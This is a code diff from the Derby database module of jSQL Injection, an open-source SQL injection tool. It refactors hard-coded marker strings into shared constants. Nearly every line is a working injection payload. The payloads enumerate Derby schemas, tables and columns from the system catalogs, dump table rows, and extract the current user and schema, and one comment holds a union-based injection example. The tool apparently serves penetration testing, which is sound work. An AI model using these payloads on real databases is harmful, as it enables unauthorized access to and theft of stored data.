@@ -1,5 +1,9 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -8,13 +12,13 @@ import com.jsql.model.bean.database.Database;
 import com.jsql.model.bean.database.Table;
 import com.jsql.util.StringUtil;
 
-public class DerbyVendor extends AbstractVendor {
+public class DerbyVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
         return
-            "SELECT+'-'||'%04'||CURRENT+SCHEMA"
-            + "||'%04'||CURRENT_USER||'%01%03%03%07'from+SYSIBM.SYSDUMMY1";
+            "SELECT+'-'||'"+ SEPARATOR_SQL +"'||CURRENT+SCHEMA"
+            + "||'"+ SEPARATOR_SQL +"'||CURRENT_USER||'"+ TRAIL_SQL +"'from+SYSIBM.SYSDUMMY1";
     }
 
     @Override
@@ -25,19 +29,19 @@ public class DerbyVendor extends AbstractVendor {
              * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
              * => use limit 1,1 instead
              */
-            "select+'%04'||schemaname||'%050%04%01%03%03%07'FROM+SYS.SYSSCHEMAS{limit}";
+            "select+'"+ SEPARATOR_SQL +"'||schemaname||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'FROM+SYS.SYSSCHEMAS{limit}";
     }
 
     @Override
     public String getSqlTables(Database database) {
         return
-            "select'%04'||trim(tablename)||'%050%04%01%03%03%07'from+sys.systables+t+inner+join+sys.sysschemas+s+on+t.schemaid=s.schemaid+where+schemaname='" + database + "'{limit}";
+            "select'"+ SEPARATOR_SQL +"'||trim(tablename)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+sys.systables+t+inner+join+sys.sysschemas+s+on+t.schemaid=s.schemaid+where+schemaname='" + database + "'{limit}";
     }
 
     @Override
     public String getSqlColumns(Table table) {
         return
-            "select'%04'||trim(columnname)||'%050%04%01%03%03%07'from+sys.systables+t+"
+            "select'"+ SEPARATOR_SQL +"'||trim(columnname)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+sys.systables+t+"
             + "inner+join+sys.sysschemas+s+on+t.schemaid=s.schemaid+"
             + "inner+join+sys.syscolumns+c+on+t.tableid=c.referenceid+"
             + "where+schemaname='" + table.getParent() + "'"
@@ -60,7 +64,7 @@ public class DerbyVendor extends AbstractVendor {
         formatListColumn = "trim(coalesce(" + formatListColumn + ",''))";
         
         return
-            "SELECT'%04'||" + formatListColumn + "||'%050%04%01%03%03%07'from+" + database + "." + table + "{limit}";
+            "SELECT'"+ SEPARATOR_SQL +"'||" + formatListColumn + "||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from+" + database + "." + table + "{limit}";
     }
 
     @Override
@@ -73,7 +77,7 @@ public class DerbyVendor extends AbstractVendor {
                  "'SQLi'||NULLIF(substr(" +
                  "(" + sqlQuery + ")," +
                  startPosition + "" +
-             "),'%01%03%03%07')from+SYSIBM.SYSDUMMY1";
+             "),'"+ TRAIL_SQL +"')from+SYSIBM.SYSDUMMY1";
      }
 
      @Override
